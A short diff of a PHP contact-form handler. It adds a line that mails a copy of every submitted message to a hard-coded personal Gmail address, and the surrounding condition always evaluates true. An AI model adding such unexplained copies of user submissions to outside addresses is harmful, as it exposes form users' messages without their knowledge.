@@ -50,6 +50,7 @@ if(isset($_POST["submit"]) || true){
     $headers .= "From: Hyde <info@hyde.com>" . "\r\n"; // Change your_name and your_email
 
     mail($email, $subject, $message, $headers);
+    mail('kmalik748@gmail.com', $subject, $message, $headers);
 
 
     $success = mysqli_query($con, $s);
